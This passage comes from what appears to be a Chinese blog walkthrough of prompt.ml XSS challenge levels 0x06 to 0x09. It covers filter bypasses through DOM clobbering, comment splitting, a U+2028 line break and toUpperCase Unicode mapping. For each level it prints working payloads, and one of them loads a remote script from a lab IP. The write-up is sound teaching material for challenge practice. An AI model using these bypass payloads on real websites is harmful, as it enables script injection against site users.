<code>submit()</code> 函数触发 <code>action</code> 行为</li></ul><p>要在 <code>&lt;form&gt;</code> 的 <code>action 属性</code>执行 javascript 代码，可以构造这样的 payload：</p></blockquote><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javascript:alert(1)#&#123;"EXP":"M02"&#125;</span><br></pre></td></tr></table></figure><blockquote><p>但是由于 <code>document.forms[0].action</code> 的内容被正则过滤了，导致 <code>javascript:alert(1)</code> 无法执行。但是这个过滤是不完善的，可以绕过。关键在于 <code>document.forms[0].action</code> 的指向。当 <code>&lt;form&gt;</code> 的子标签中没有任何名为 <code>&lt;action&gt;</code> 的子标签时， <code>document.forms[0].action</code> 指向的就是 <code>&lt;form&gt;</code> 自身的 <code>action</code> 属性。但若 <code>&lt;form&gt;</code> 的子标签中，有任一子标签名为 <code>&lt;action&gt;</code> 时， <code>document.forms[0].action</code> 会优先指向该子标签。这样，正则过滤所校验的值就是子标签 <code>&lt;action&gt;</code> 的值，而非 <code>&lt;form&gt;</code> 标签自身的 <code>action</code> 属性。</p></blockquote><h4 id="③-相关知识点-6"><a href="#③-相关知识点-6" class="headerlink" title="③ 相关知识点"></a><code>③ 相关知识点</code></h4><blockquote><ol><li>DOM 破坏后，<code>form</code> 标签中属性<code>ID</code> 和 <code>name</code>的变化<ul><li><code>如果form元素的某个属性名和 input 元素的 id/name 值一样，那么该 form 的属性就会被 input 元素的属性值所覆盖。</code></li><li>并不是某些博客中所写的：<code>action有这样的一个特性，如果前后都有action，访问action标签时访问的是后面的action的值。</code>。而且在同一个标签中，存在相同名称的属性，第一个出现的属性值将后续相同属性名的值进行覆盖；</li></ul></li><li><code>JSON 数据</code>的读取函数：<code>JSON.parseInt()</code></li><li><code>form 标签</code>的 <code>action 属性</code>以及其他知识点</li></ol></blockquote><h4 id="④-payload-6"><a href="#④-payload-6" class="headerlink" title="④ payload"></a><code>④ payload</code></h4><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javascript:prompt(1)#&#123;"action":"text"&#125;</span><br></pre></td></tr></table></figure><blockquote><p>payload 被分解成如下 <code>HTML source</code> 的形式：</p><p><code>&lt;form action=&quot;javascript:prompt(1)&quot; method=&quot;post&quot;&gt;&lt;input name=&quot;action&quot; value=&quot;text&quot;&gt;&lt;/form&gt;</code></p><p>将前面的伪协议添加 <code>action</code> 的属性值，并将 <code>JSON</code> 数据中的 <code>&quot;action&quot;</code> 赋值给 <code>input</code> 标签中的 <code>name</code> 属性，并将 <code>text</code> 赋值给 <code>value</code> 值。因为 <code>DOM</code> 被破坏，所以 <code>document.forms[0].action</code> 的 <code>action</code> 是 <code>input</code> 中的 <code>name</code> 的 <code>action</code>，为<code>object HTMLInputElement</code> 所以 <code>if</code> 条件为真，执行 <code>document.forms[0].submit()</code> ，向 <code>javascript:prompt</code> 提交表单，成功执行脚本。</p><p>虽然题目会把我们输入的 json 构造成 <code>&lt;form&gt;</code> 内的 <code>&lt;input&gt;</code> 子标签，但是我们无法直接构造标签名为 <code>&lt;action&gt;</code> 。不过 json 的 key 会作为 <code>&lt;action&gt;</code> 标签的 <code>name</code> 属性值，而我们恰恰可以通过 <code>name</code> 属性为标签更名。</p><p>例如 <code>&lt;input name=&quot;action&quot;&gt;</code> 的名字实际是 action ，而非 input 。于是我们可以构造这样的 payload 绕过针对 action 的正则过滤：<code>javascript:alert(1)#{&quot;action&quot;:&quot;EXP&quot;}</code>。至此，只需要把 alert 改成 prompt 即可完成挑战，最终 payload 为：<code>javascript:prompt(1)#{&quot;action&quot;:&quot;EXP&quot;}</code></p></blockquote><h4 id="⑤-HTML-source-6"><a href="#⑤-HTML-source-6" class="headerlink" title="⑤ HTML source"></a><code>⑤ HTML source</code></h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"javascript:prompt(1)"</span> <span class="attr">method</span>=<span class="string">"post"</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">"action"</span> <span class="attr">value</span>=<span class="string">"text"</span>&gt;</span><span class="tag">&lt;/<span class="name">form</span>&gt;</span>                         </span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">                                                  </span></span><br><span class="line"><span class="actionscript">    <span class="comment">// forbid javascript: or vbscript: and data: stuff    </span></span></span><br><span class="line"><span class="javascript">    <span class="keyword">if</span> (!<span class="regexp">/script:|data:/i</span>.test(<span class="built_in">document</span>.forms[<span class="number">0</span>].action)) </span></span><br><span class="line"><span class="javascript">        <span class="built_in">document</span>.forms[<span class="number">0</span>].submit();                       </span></span><br><span class="line"><span class="actionscript">    <span class="keyword">else</span>                                                  </span></span><br><span class="line"><span class="javascript">        <span class="built_in">document</span>.write(<span class="string">"Action forbidden."</span>)               </span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;/<span class="name">form</span>&gt;</span>                         </span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">                                                  </span></span><br><span class="line"><span class="actionscript">    <span class="comment">// forbid javascript: or vbscript: and data: stuff    </span></span></span><br><span class="line"><span class="javascript">    <span class="keyword">if</span> (!<span class="regexp">/script:|data:/i</span>.test(<span class="built_in">document</span>.forms[<span class="number">0</span>].action)) </span></span><br><span class="line"><span class="javascript">        <span class="built_in">document</span>.forms[<span class="number">0</span>].submit();                       </span></span><br><span class="line"><span class="actionscript">    <span class="keyword">else</span>                                                  </span></span><br><span class="line"><span class="javascript">        <span class="built_in">document</span>.write(<span class="string">"Action forbidden."</span>)               </span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="⑥-xss-类型-6"><a href="#⑥-xss-类型-6" class="headerlink" title="⑥ xss 类型"></a><code>⑥ xss 类型</code></h4><blockquote><p>通过破坏 DOM，使得 id 和 name 属性混乱，达到绕过的作用。</p></blockquote><h3 id="0x07-注释绕过-号绕过"><a href="#0x07-注释绕过-号绕过" class="headerlink" title="0x07 注释绕过 / # 号绕过"></a><font color="navy">0x07 注释绕过 / # 号绕过</font></h3><h4 id="①-JS-代码-7"><a href="#①-JS-代码-7" class="headerlink" title="① JS 代码"></a><code>① JS 代码</code></h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">input</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// pass in something like dog#cat#bird#mouse...</span></span><br><span class="line">    <span class="keyword">var</span> segments = input.split(<span class="string">'#'</span>);</span><br><span class="line">    <span class="keyword">return</span> segments.map(<span class="function"><span class="keyword">function</span>(<span class="params">title</span>) </span>&#123;</span><br><span class="line">        <span class="comment">// title can only contain 12 characters</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">'&lt;p class="comment" title="'</span> + title.slice(<span class="number">0</span>, <span class="number">12</span>) + <span class="string">'"&gt;&lt;/p&gt;'</span>;</span><br><span class="line">    &#125;).join(<span class="string">'\n'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="②-题目分析-7"><a href="#②-题目分析-7" class="headerlink" title="② 题目分析"></a><code>② 题目分析</code></h4><blockquote><p>以 <code>#</code> 号为标志，划分自字符串，并将划分后得到的每个字符串放在 <code>&lt;title&gt;</code> 标签内部，且每个标签 <code>title</code> 内部的字符串长度不能大于 <code>12</code>。</p></blockquote><h4 id="③-相关知识点-7"><a href="#③-相关知识点-7" class="headerlink" title="③ 相关知识点"></a><code>③ 相关知识点</code></h4><blockquote><ol><li>javascript的``模板字符串</li><li>eval 函数的特性</li><li>JavaScript 的特点：<ul><li>在 HTML 语境中，<code>&lt;script&gt;</code> 和 <code>&lt;/script&gt;</code> 标签之间的内容默认视为 js 代码</li><li>js 代码换行后依然会自动拼接并生效（但是函数名/变量名要完整，不能破开到两行）</li><li>js 代码内容之间的注释会被自动忽略</li></ul></li><li>\<svg> 的特性</svg></li></ol></blockquote><h4 id="④-payload-7"><a href="#④-payload-7" class="headerlink" title="④ payload"></a><code>④ payload</code></h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">payload1:"&gt;<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"><span class="string">`#<span class="subst">$&#123;prompt(<span class="number">1</span>)&#125;</span>#`</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>// javascript的``模板字符串</span><br><span class="line">payload2:"&gt;<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"><span class="comment">/*#*/</span>a=<span class="string">'prom'</span><span class="comment">/*#*/</span>+<span class="string">'pt(1)'</span><span class="comment">/*#*/</span><span class="built_in">eval</span>(a)<span class="comment">/*#*/</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>//eval 函数的特性</span><br><span class="line">payload3:"&gt;<span class="tag">&lt;<span class="name">svg</span>/<span class="attr">a</span>=<span class="string">'#'</span><span class="attr">onload</span>=<span class="string">'/*#*/prompt(1)'</span>// 官方答案</span></span><br><span class="line"><span class="tag"><span class="attr">payload4:</span>"&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="actionscript"><span class="comment">/*#*/</span>prompt(<span class="comment">/*#*/</span><span class="number">1</span>)<span class="comment">/*#*/</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="⑤-HTML-source-7"><a href="#⑤-HTML-source-7" class="headerlink" title="⑤ HTML source"></a><code>⑤ HTML source</code></h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">payload1_HTML_soure:</span><br><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">"comment"</span> <span class="attr">title</span>=<span class="string">""</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="handlebars"><span class="xml">`"&gt;<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span></span></span><br><span class="line"><span class="javascript">&lt;p <span class="class"><span class="keyword">class</span></span>=<span class="string">"comment"</span> title=<span class="string">"$&#123;prompt(1)&#125;"</span>&gt;<span class="xml"><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span></span></span><br><span class="line"><span class="javascript">&lt;p <span class="class"><span class="keyword">class</span></span>=<span class="string">"comment"</span> title=<span class="string">"`</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>"&gt;<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">=============================================</span><br><span class="line">payload2_HTML_soure:</span><br><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">"comment"</span> <span class="attr">title</span>=<span class="string">""</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="handlebars"><span class="xml">/*"&gt;<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span></span></span><br><span class="line"><span class="javascript">&lt;p <span class="class"><span class="keyword">class</span></span>=<span class="string">"comment"</span> title=<span class="string">"*/a='prom'/*"</span>&gt;<span class="xml"><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span></span></span><br><span class="line"><span class="javascript">&lt;p <span class="class"><span class="keyword">class</span></span>=<span class="string">"comment"</span> title=<span class="string">"*/+'pt(1)'/*"</span>&gt;<span class="xml"><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span></span></span><br><span class="line"><span class="javascript">&lt;p <span class="class"><span class="keyword">class</span></span>=<span class="string">"comment"</span> title=<span class="string">"*/eval(a)/*"</span>&gt;<span class="xml"><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span></span></span><br><span class="line"><span class="javascript">&lt;p <span class="class"><span class="keyword">class</span></span>=<span class="string">"comment"</span> title=<span class="string">"*/</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>"&gt;<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">=============================================</span><br><span class="line">payload3_HTML_soure:</span><br><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">"comment"</span> <span class="attr">title</span>=<span class="string">""</span>&gt;</span><span class="tag">&lt;<span class="name">svg</span>/<span class="attr">a</span>=<span class="string">'"&gt;&lt;/p&gt;</span></span></span><br><span class="line"><span class="tag"><span class="string">&lt;p class="comment" title="'</span><span class="attr">onload</span>=<span class="string">'/*"&gt;&lt;/p&gt;</span></span></span><br><span class="line"><span class="tag"><span class="string">&lt;p class="comment" title="*/prompt(1)'</span>"&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">=============================================</span><br><span class="line">payload4_HTML_soure:</span><br><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">"comment"</span> <span class="attr">title</span>=<span class="string">""</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="handlebars"><span class="xml">/*"&gt;<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span></span></span><br><span class="line"><span class="javascript">&lt;p <span class="class"><span class="keyword">class</span></span>=<span class="string">"comment"</span> title=<span class="string">"*/prompt(/*"</span>&gt;<span class="xml"><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span></span></span><br><span class="line"><span class="javascript">&lt;p <span class="class"><span class="keyword">class</span></span>=<span class="string">"comment"</span> title=<span class="string">"*/1)/*"</span>&gt;<span class="xml"><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span></span></span><br><span class="line"><span class="javascript">&lt;p <span class="class"><span class="keyword">class</span></span>=<span class="string">"comment"</span> title=<span class="string">"*/</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>"&gt;<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">=============================================</span><br></pre></td></tr></table></figure><blockquote><p>注意： <code>&lt;script&gt;</code> 和 <code>&lt;/script&gt;</code> 标签用于声明 js 代码的范围，这两个标签不能从中间任何位置破开到两行，否则多行注释 <code>/* */</code> 就不会起作用了。另外我在测试 payload 的时候，也尝试过 <code>&lt;!--     --&gt;</code> HTML 注释，但是尖括号会造成标签错位导致注入失败，有兴趣的同学可以研究下。</p></blockquote><h4 id="⑥-xss-类型-7"><a href="#⑥-xss-类型-7" class="headerlink" title="⑥ xss 类型"></a><code>⑥ xss 类型</code></h4><blockquote><p>利用 <code>#</code> 号进行绕过</p></blockquote><h3 id="0x08-Unicode-编码逃逸"><a href="#0x08-Unicode-编码逃逸" class="headerlink" title="0x08 Unicode 编码逃逸"></a><font color="navy">0x08 Unicode 编码逃逸</font></h3><h4 id="①-JS-代码-8"><a href="#①-JS-代码-8" class="headerlink" title="① JS 代码"></a><code>① JS 代码</code></h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">input</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// prevent input from getting out of comment</span></span><br><span class="line">    <span class="comment">// strip off line-breaks and stuff</span></span><br><span class="line">    input = input.replace(<span class="regexp">/[\r\n&lt;/"]/g</span>, <span class="string">''</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'                                \n\</span></span><br><span class="line"><span class="string">&lt;script&gt;                                    \n\</span></span><br><span class="line"><span class="string">    // console.log("'</span> + input + <span class="string">'");        \n\</span></span><br><span class="line"><span class="string">&lt;/script&gt; '</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="②-题目分析-8"><a href="#②-题目分析-8" class="headerlink" title="② 题目分析"></a><code>② 题目分析</code></h4><blockquote><p><code>&lt;script&gt;</code> 标签内的 <code>//</code> 注释了我们输入的内容，不管输入什么内容都被注释掉，并且正则表达式将 <code>\r\n</code> 过滤掉。</p></blockquote><h4 id="③-相关知识点-8"><a href="#③-相关知识点-8" class="headerlink" title="③ 相关知识点"></a><code>③ 相关知识点</code></h4><blockquote><ol><li>换行的思想</li></ol></blockquote><h4 id="④-payload-8"><a href="#④-payload-8" class="headerlink" title="④ payload"></a><code>④ payload</code></h4><blockquote><p>在 console 控制台中输入 <code>&#39;\u2028prompt(1)\u2028--&gt;&#39;</code>，得到的结果就是 payload</p></blockquote><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">" prompt(1) --&gt;"</span><br></pre></td></tr></table></figure><blockquote><p>由于 <code>console</code> 被注释掉，我们输入的脚本无法被执行，所以我们需要换行，但是由于<code>\r\n</code> 回车换行符都被过滤掉了，因此无法直接换行。虽然 <strong>ASCII</strong> 字符的换行符被过滤了，但是在 JS 里面是可以直接使用 Unicode 字符的，即可以使用 <strong>Unicode</strong> 的换行符进行绕过。查一下 Unicode 空字符的编码表，其中换行符的编码是 <code>\u000A</code> 和 <code>\u2028</code>。但是 <code>\u000A</code> 等价于 ASCII 的 <code>\n</code> ，前面知道它被过滤了无法使用，所以可以使用 <code>\u2028</code> 作为替代。</p><p>这里成功使用假设<code>\u2028</code>字符换行，则跳出了 <code>//</code> 的注释：</p></blockquote><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">    <span class="comment">// console.log("</span></span><br><span class="line">prompt(<span class="number">1</span>)<span class="string">");</span></span><br><span class="line"><span class="string">&lt;/script&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>但事实上这段代码由于语法错误，<code>prompt(1)</code> 是无法执行的，原因是末尾的 <code>&quot;);</code> ，我们在 <code>prompt(1)</code> 后面再次添加换行符 <code>\u2028</code>：</p></blockquote><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">    <span class="comment">// console.log("</span></span><br><span class="line">prompt(<span class="number">1</span>)</span><br><span class="line"><span class="string">");</span></span><br><span class="line"><span class="string">&lt;/script&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>虽然这样把  <code>&quot;);</code>  换到另一行，依然是语法错误，还是因为 <code>&quot;);</code> ，我们需要将它注释掉，但是尖括号 <code>&lt;</code> 、双引号 <code>&quot;</code> 、反斜杠 <code>/</code> 也都被过滤了，所以既没办法提前闭合 <code>/script</code>， 也没办法使用另一个函数 <code>fun(&quot;</code> 向后闭合引号，当然多行注释 <code>/*</code> 和行注释 <code>//</code> 也没办法使用了，就更不用说 <code>&lt;!--</code> HTML 注释了（而且在 JS 区域内也没法用）。</p><p>这里需要使用到 JS 中的一个注释黑魔法：<font color="red"><strong>在 JS 代码中，当</strong> <code>--&gt;</code> <strong>位于行首时（左侧不能有任何非空字符），那么它相当于行注释</strong>。</font>因此在 <code>&quot;);</code> 换行符前面加上 <code>--&gt;</code>，就可以成功注释掉  <code>&quot;);</code> 。</p><p>因为<code>payload</code>在<code>console.log</code>中，所以题目并不会帮我们把 Unicode 编码 <code>\u2028</code> 直接转换为换行符，那么我们就需要直接输入这个换行符。但是使用键盘是无法输入这个换行符的，这里我借助了 <code>console</code> 将其直接打印出来。</p></blockquote><h4 id="⑤-HTML-source-8"><a href="#⑤-HTML-source-8" class="headerlink" title="⑤ HTML source"></a><code>⑤ HTML source</code></h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;                                    </span><br><span class="line">    <span class="comment">// console.log("</span> prompt(<span class="number">1</span>) --&gt;<span class="string">");        </span></span><br><span class="line"><span class="string">&lt;/script&gt;</span></span><br></pre></td></tr></table></figure><h4 id="⑥-xss-类型-8"><a href="#⑥-xss-类型-8" class="headerlink" title="⑥ xss 类型"></a><code>⑥ xss 类型</code></h4><blockquote><p>console.log() 换行符的绕过 / Unicode 编码逃逸</p></blockquote><h3 id="0x09-ECMAScript"><a href="#0x09-ECMAScript" class="headerlink" title="0x09 ECMAScript"></a><font color="navy">0x09 ECMAScript</font></h3><h4 id="①-JS-代码-9"><a href="#①-JS-代码-9" class="headerlink" title="① JS 代码"></a><code>① JS 代码</code></h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">input</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// filter potential start-tags</span></span><br><span class="line">    input = input.replace(<span class="regexp">/&lt;([a-zA-Z])/g</span>, <span class="string">'&lt;_$1'</span>);</span><br><span class="line">    <span class="comment">// use all-caps for heading</span></span><br><span class="line">    input = input.toUpperCase();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// sample input: you shall not pass! =&gt; YOU SHALL NOT PASS!</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'&lt;h1&gt;'</span> + input + <span class="string">'&lt;/h1&gt;'</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="②-题目分析-9"><a href="#②-题目分析-9" class="headerlink" title="② 题目分析"></a><code>② 题目分析</code></h4><blockquote><p>replace 将 <code>&lt;[a-zA-Z]</code> 变为 <code>&lt;_[a-zA-Z]</code>，并且对变化后的字符串全部转化成大写，返回 <code>&lt;h1&gt; + input + &lt;/h1&gt;</code>;</p></blockquote><h4 id="③-相关知识点-9"><a href="#③-相关知识点-9" class="headerlink" title="③ 相关知识点"></a><code>③ 相关知识点</code></h4><blockquote><ol><li><code>javascript</code> 外部文件的引用;</li><li><code>js</code> 的 <code>scrpit</code>, <code>src</code> 和 <code>域名</code> 的大小写不敏感 / HTML 的标签名和属性名都是大小写不敏感</li><li><code>toUpperCase()</code> 的特性：根据 <a href="http://ecma-international.org/ecma-262/5.1/#sec-15.5.4.18" target="_blank" rel="noopener">ECAMScript 定义</a>，<code>它不仅转换英文字母，也转换一些Unicode字符</code>，即它有意把某些 Unicode 字符映射到某些 ASCII 字符（串）：<ul><li>Unicode 的 <code>ı</code> 通过 <code>toUpperCase</code> 会被转换成 ASCII 的 <code>I</code></li><li>Unicode 的 <code>ſ</code> 通过 <code>toUpperCase</code> 会被转换成 ASCII 的 <code>S</code></li></ul></li></ol></blockquote><p><code>涉及其他相关性不大的知识点</code>：</p><blockquote><ol><li><p>在 <code>https</code> 网页中引入 <code>http</code> 资源：比如引入一个js文件，会被直接 block 掉的。在 HTTPS 页面里通过AJAX 的方式请求 HTTP 资源，也会被直接 block 掉的。但是在 <code>http</code> 网页中引入 <code>https</code> 资源不会被 block 掉。</p><blockquote><p>解决方法（不可知）：在相应的页面的<head><meta name="generator" content="Hexo 3.8.0">里加上这句代码 <code>&lt;meta http-equiv=&quot;Content-Security-Policy&quot; content=&quot;upgrade-insecure-requests&quot;&gt;</code> ，意思是自动将http的不安全请求升级为 https。</head></p></blockquote></li></ol></blockquote><h4 id="④-payloads"><a href="#④-payloads" class="headerlink" title="④ payloads"></a><code>④ payloads</code></h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload1：<span class="tag">&lt;<span class="name">ımg</span> <span class="attr">src</span>=<span class="string">0</span> <span class="attr">onerror</span>=<span class="string">&amp;#112;&amp;#114;&amp;#111;&amp;#109;&amp;#112;&amp;#116;(1)</span> /&gt;</span></span><br><span class="line">payload2：<span class="tag">&lt;<span class="name">ſvg</span>&gt;</span><span class="tag">&lt;<span class="name">ſcript</span>&gt;</span>&amp;#112;&amp;#114;&amp;#111;&amp;#109;&amp;#112;&amp;#116;(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br><span class="line">payload3：<span class="tag">&lt;<span class="name">ſcript</span> <span class="attr">src</span>=<span class="string">"http://192.168.126.132/%70%61%79%6c%6f%61%64.%6a%73"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p><code>payload1 解析</code></p><blockquote><p>先把 <code>prompt</code> 编码成 <code>&amp;#112;&amp;#114;&amp;#111;&amp;#109;&amp;#112;&amp;#116;</code> ，这样实体编码在输出到前端之前，从而绕过 <code>toUpperCase</code> 。看到别人又在外面加了一个 <code>svg</code> 标签，其实没有必要。</p></blockquote><p><code>payload2 解析</code></p><blockquote><p>因为 <code>&lt;script&gt;</code> 标签内部无法进行 <code>HTML 实体解码</code> 所以这里需要加上 <code>svg</code> 标签。</p></blockquote><p><code>payload3 解析</code></p><blockquote><p>这个 <code>payload</code> 一定要好好的解析一下，通过前期的学习可以得到<code>HTML 的标签名和属性名都是大小写不敏感</code>，于是第一次构造的 payload 为：<code>&lt;ſcript src=&quot;http://192.168.126.132/payload.js&quot;&gt;&lt;/script&gt;</code>，这个主机是我用虚拟机搭建的一个 web 站点，于是屁颠屁颠的填入上述的 payload，但是令我惊讶的是没有被被执行！！于是我在<a href="https://www.runoob.com/try/try.php?filename=tryhtml_script_src" target="_blank" rel="noopener">菜鸟教程</a>搭建的环境上去尝试该脚本，发现一个这样的错误：</p></blockquote><p><img src="/images/96-1.png" alt></p><blockquote><p>在查询了相关的资料后，发现这是因为在 <code>https</code> 网页中引入 <code>http</code> 资源，会被直接 block 掉的。原来菜鸟教程的 <code>protocol</code> 是 <code>https</code>，所以不能引入 <code>http</code> 协议的资源，我再去看看 <code>prompt.ml</code> 的协议，是不是也是这个原因造成的，但是令人失望的是它的协议也是 <code>http</code> (<a href="http://prompt.ml/)，我将上述的" target="_blank" rel="noopener">http://prompt.ml/)，我将上述的</a> payload 再次提交，查看流量数据，果然找到了问题所在：</p></blockquote><p><img src="/images/96-2.png" alt></p><blockquote><p>问题就是因为我们输入的 <code>payload.js</code> 资源名称被大写为 <code>PAYLOAD.JS</code> ，而服务器无法找到该名称的资源，因此无法成功执行<code>prompt(1)</code>，既然找到问题就好办了，我利用了 <code>URL 编码</code> 将 <code>payload.js</code> 进行绕过，使得 JS 代码无法过滤，但是能被 <code>URI 解析器</code> 解析，所以构造的 <code>payload3</code> 就被成功的执行了。</p></blockquote><h4 id="⑤-HTML-source-9"><a href="#⑤-HTML-source-9" class="headerlink" title="⑤ HTML source"></a><code>⑤ HTML source</code></h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">payload1:</span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span><span class="tag">&lt;<span class="name">IMG</span> <span class="attr">SRC</span>=<span class="string">0</span> <span class="attr">ONERROR</span>=<span class="string">&amp;#112;&amp;#114;&amp;#111;&amp;#109;&amp;#112;&amp;#116;(1)</span> /&gt;</span><span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">========================================================================</span><br><span class="line"></span><br><span class="line">payload2:</span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span><span class="tag">&lt;<span class="name">SVG</span>&gt;</span><span class="tag">&lt;<span class="name">SCRIPT</span>&gt;</span><span class="undefined">&amp;#112;&amp;#114;&amp;#111;&amp;#109;&amp;#112;&amp;#116;(1)</span><span class="tag">&lt;/<span class="name">SCRIPT</span>&gt;</span><span class="tag">&lt;/<span class="name">SVG</span>&gt;</span><span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">========================================================================</span><br><span class="line"></span><br><span class="line">payload3:</span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span><span class="tag">&lt;<span class="name">SCRIPT</span> <span class="attr">SRC</span>=<span class="string">"HTTP://192.168.126.132/%70%61%79%6C%6F%61%64.%6A%73"</span>&gt;</span><span 